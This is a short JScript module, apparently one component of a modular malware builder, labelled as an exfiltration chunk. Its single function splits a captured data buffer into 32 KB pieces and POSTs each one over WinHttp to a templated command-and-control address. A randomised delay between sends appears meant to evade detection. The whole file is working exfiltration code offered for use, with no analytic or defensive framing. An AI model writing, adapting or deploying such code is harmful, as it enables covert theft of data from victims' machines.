// chunk: exfil/http_get_chunks
// depends: core/emit_buffer
// provides: exfil_http_chunked
// format: jscript

function exfil_http_chunked() {
    var chunkSize = 32768;
    var h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
    var total = _buf.length;
    for (var i = 0; i < total; i += chunkSize) {
        var chunk = _buf.substring(i, Math.min(i + chunkSize, total));
        try {
            h.Open("POST", "http://{{C2_IP}}:{{C2_PORT}}/chunk?offset=" + i + "&total=" + total, false);
            h.SetRequestHeader("Content-Type", "application/octet-stream");
            h.Send(chunk);
        } catch(ex) { break; }
        WScript.Sleep(500 + Math.floor(Math.random() * 1000));
    }
}
